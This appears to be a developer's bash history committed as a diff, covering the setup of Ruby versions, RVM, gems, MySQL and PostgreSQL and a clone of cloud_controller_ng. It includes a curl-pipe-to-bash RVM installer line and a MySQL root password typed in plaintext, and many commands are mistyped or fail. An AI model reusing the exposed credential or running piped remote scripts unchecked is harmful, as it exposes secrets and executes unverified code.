+cd
+sudo apt-get update
+sudo apt-get install docker.io
+docker
+source /etc/bash_completion.d/docker.io
+docker init
+docker info
+sudo docker info
+grep *.rb
+ls
+grep example.*
+cat examples.desktop 
+grep 'mau' examples.desktop 
+grep [sw] examples.desktop 
+grep '[sw]' examples.desktop 
+clear
+grep '[sw]' examples.desktop 
+ruby -v
+rubymine
+./rubymine
+cd /obj
+cd /obt
+cd /opt/
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+./rubymine.sh 
+ls
+./rubymine.sh 
+cd
+sudo apt-get install ruby1.9.3
+sudo apt-get install python-software-properties
+sudo apt-add-repository ppa:brightbox/ruby-ng
+sudo apt-get update
+sudo apt-get install ruby-switch
+which ruby
+ruby -v
+ruby-switch
+ruby-switch --list
+ruby -v
+update-alternatives
+update-alternatives --config ruby
+update-alternatives --list
+update-alternatives --all
+which ruby
+cd /usr/bin/
+ls
+ls -la | grep ruby
+cd ruby1.9.3
+update-alternatives --set ruby /usr/bin/ruby1.9.3 
+update-alternatives --config ruby
+update-alternatives --query ruby
+sudo update-alternatives --query ruby
+update-alternatives 
+update-alternatives --display
+update-alternatives --display ruby
+update-alternatives --list
+update-alternatives --list ruby
+sudo update-alternatives --config ruby
+ruby-switch
+ruby-switch --listy
+ruby-switch --list
+ruby-switch --check
+ruby-switch --list ruby
+ruby -v
+irb
+which ruby
+ruby -v
+rbenv unistall 2.1.3
+rbenv uninstall 2.1.3
+ruby -v
+which ruby
+locate ruby
+locate ruby | less
+which ruby
+sudo apt-get remove ruby
+which ruby
+ls 
+ruby -v
+ruby -version
+which ruby
+cd ruby
+gem list
+gem uninstall -Iax STRING
+gem uninstall -Iax bundler
+gem list
+gem uninstall -Iax debuild 
+gem uninstall -Iax *
+gem list
+gem uninstall debugger-ruby_core_source
+gem uninstall docile
+gem uninstall multi_json
+gem uninstall ruby-debug-base19x
+gem uninstall ruby-debug-ide
+gem list
+gem uninstall power_assert
+gem uninstall simplecov
+gem uninstall simplecov-html
+gem uninstall test-unit
+gem list
+cd /
+gem list
+locate ruby
+cd 
+ls -la | grep ruby
+ls -la | grep gem\
+ls -la | grep gem
+sudo rm -rf .gem/
+sudo apt-get suspend
+sudo suspend
+sudo shutdown -h now
+gem install rspec
+gem install rcov
+sudo install rubygems-update
+update-rubygems
+gem update --system
+gem install rubygems-update
+update_rubygems
+gem update --system
+gem install rcov
+cat ~/.rbenv
+ls
+locate rbenv
+gem install rcov
+make
+cd locate callsite.c
+locate callsite.c
+locate siteconf20141204-6048-mxgbcf.rb
+find siteconf20141204-6048-mxgbcf.rb
+gem install rcov
+gem install simplecov
+cd /opt/RubyMine-7.0/
+ls
+cd bin/
+./rubymine.sh 
+which ruby
+ruby -v
+cd /usr/
+cd bin/
+ls
+cd ruby
+which ruby
+cd ruby
+ls -la | grep 'ruby'
+sudo apt-get uninstall ruby-swithc
+sudo apt-get uninstall ruby-switch
+sudo apt-get remove ruby-switch
+sudo apt-get remove ruby1.9.1
+ls -la | grep 'ruby'
+sudo apt-get remove ruby1.9.3
+locate ruby
+locate ruby | grep 'ruby1.9.1'
+cat /var/cache/apt/archives/ruby1.9.1_1.9.3.484-2ubuntu1.2_amd64.deb
+cd ~
+ls
+cd Documents/
+ls
+cat technicalExpression~ 
+grep 'support' technicalExpression~ 
+gedit technicalExpression~ 
+cd /
+locate ruby | less
+rvm list
+gem install mysql2 -v 0.3.13
+gem help
+gem
+gem install mysql2
+which ruby
+ruby -v
+rvm list
+rvm --default set 2.1.4
+rvm --set default 2.1.4
+rvm set --default 2.1.4
+rvm --default use 2.1.4
+ruby -v
+rvm use system
+rvm --default use 2.1.4
+source ~/.bashrc
+rvm --default use 2.1.4
+which ruby
+ruby -v
+gem install mysql2 -v 0.3.13
+sudo apt-get install mysql-client libmysqlclient-dev
+gem install mysql2 -v 0.3.13
+gem install pg -v 0.16.0
+sudo apt-get install libpq-dev
+gem install pg
+gem install sinatra-contrib -v 1.4.2
+rvm gemset list
+rvm gemset list default
+rvm gemset list default gem list
+gem list
+gedit
+exit
+which ruby
+irb
+ruby -v
+gpg --keyserver hkp://keys.gnupg.net --recv-keys D39DC0E3
+rvm install 2.1.3
+\curl -sSL https://get.rvm.io | bash
+rvm install 2.1.3
+source /home/nino/.rvm/scripts/rvm
+rvm install 2.1.3
+sudo rvm install 2.1.3
+rvm list known
+sudo rvm install 1.9.3
+rvm install 1.9.3
+which ruby
+ruby -v
+sudo apt-get update
+rvm list know
+rvm list known
+rvm install 1.9.3
+sudo apt-get update
+cd /etc/ap
+cd /etc
+ls
+cd apt
+ls
+cat sources.list
+cat sources.list | grep ' http://ppa.launchpad.net'
+apt-cdrom
+apt-cdrom update
+apt-cdrom ident
+apt-get update
+sudo apt-get update && sudo apt-get upgrade
+rvm list known
+rvm install 1.9.3
+rvm use 1.9.3
+which ruby
+ruby -v
+irb
+rvm rubygems latest
+cd ~/Documents/
+ls
+cd Commands/
+ls
+vim rubyRvm.tx
+ls
+rename rubyRvm.tx rubyRvm.txt
+ls
+mv rubyRvm.tx rubyRvm.txt
+ls
+rvm
+rvm list 
+rvm install 2.1.1
+rvm install 2.1.3
+rvm install 2.1.4
+rvm list
+rvm gemset list
+rvm help
+gem list
+gem system update
+gem system --update
+gem update system
+gem update --system
+rvm list
+rvm default set 1.9.3
+rvm default use 1.9.3
+ruby -v
+rvm --default use 2.1.4
+rvm default use 1.9.3
+gem --update system
+gem update --system
+rvm --default use 2.1.4
+which ruby
+ruby -v
+sudo service mysql restart
+sudo apt-get update
+sudo apt-get install mysql-server
+sudo service mysql restart
+mysql cli
+cd ~
+ls
+cd RubymineProjects/
+ls
+git clone https://github.com/cloudfoundry/cloud_controller_ng.git
+rvm gemset list
+rvm list
+gim list
+gem list
+ls
+rubymine
+./rubymine
+cd/opt
+cd /opt
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+ls
+./rubymine.sh 
+cd ~
+ls
+cd RubymineProjects/
+cd cloud_controller_ng/
+cd vendor/
+cd errors/
+ls
+ls -la
+c/
+ls
+cd /
+cd ~/RubymineProjects/
+cd cloud_controller_ng/
+git pull origin master
+git fetch 
+git status -s
+git reset --hard origin/master
+git status s-s
+ls
+cd vendor/
+ls
+cd errors/
+ls
+ls -la
+vim v1.yml
+ls -la
+vim v2.yml
+ruby -v
+mysql -u root
+mysql -u root -p Sanjuan1984
+mysql -u nino -p
+cd /etc/mysql/
+ls
+cat my.cnf 
+vim my.cnf 
+ls
+mysql -u mysql -p
+cd ..
+sudo apt-get --purge remove mysql-server mysql-common mysql-client
+sudo apt-get install mysql-server mysql-common mysql-client
+mysql -u root -p
+sudo apt-get install postgresql-client
+psql -h 127.0.0.1 database user
+psql -h 127.0.0.1:5432 database user
+psq;
+psgl
+psql
+service start psql
+ps auxw | grep post
+cd /usr/local/var
+cd /usr/local/
+ls
+locate postgres
+sudo apt-get remove postgresql-client
+ps auxw | grep post
+
+cd IdeaProjects/
+ls
+cd ..
+ls
+cd RubymineProjects/
+ls
+sudo rm -rf BashHistory/
+ls
+history
+history | less
+echo krista
+psgl
+history
+rvm requirements
+rvm requirement
+rvm requirements
+cd /
+cd ~
+ls
+cd RubymineProjects/
+ls
+cd cloud_controller_ng/
+git status -s
+bundle install
+rvm gemset list
+rake
+which ruby
+ruby -v
+sudo su - postgres
+cd /
+cd /etc/init.d
+ls
+postgresql restart
+cd
+psql -U postgres
+cd /etc/postgresql
+ls
+cd 9.3
+cd main/
+ls -la
+cat postgresql.conf 
+vim postgresql.conf 
+sudo vim postgresql.conf 
+sudo -u postgres psql template1
+history
+cd /etc/postgresql
+ls
+cd 9.3
+ls
+cd main/
+sudo vim postgresql.conf 
+cd 
+cd RubymineProjects/
+ls
+cd cloud_controller_ng/
+ls
+git status -s
+cat Rakefile 
+rvm list
+rvm gemset list
+ls
+rake
+psql
+pgsql
+psql -U postgres
+psql
+cd
+ls
